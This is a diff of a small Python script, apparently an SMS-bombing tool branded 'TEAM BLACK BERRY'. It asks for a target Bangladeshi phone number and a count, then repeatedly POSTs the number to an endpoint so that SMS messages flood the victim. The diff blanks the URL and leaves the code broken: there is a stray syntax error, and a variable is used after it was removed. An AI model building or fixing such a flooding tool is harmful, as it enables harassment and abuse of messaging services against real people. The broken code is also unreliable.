@@ -4,7 +4,7 @@ print("\033[H\033[J")
 print("""
 
 
-feglat("asb")
+
                     T_B_B
          TÊÃM BLÅÇK BËRRY
          Created by: ÅSB ÃSHÏS BÎSWÅS
@@ -16,15 +16,23 @@ feglat("asb")
   Facebook : https://www.facebook.com/profile.php?id=100074238783251
  
 
-  """)                                                        
+  """)
+
+
+fegalt"ASB"
+
+                                                        
 number=str(input("Enter Terget Number:+88 "))
 amount=int(input("Enter Terget Amount: "))
-txt = "we facked you"
+url = ""
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/x-www-form-urlencoded"
 
 
 data = "phone="+number
 
 
 for i in range(amount):
-    resp = requests.post(txt, data=data)
+    resp = requests.post(txt, headers, data=data)
     print(str(i+1)+"SMS SENT")
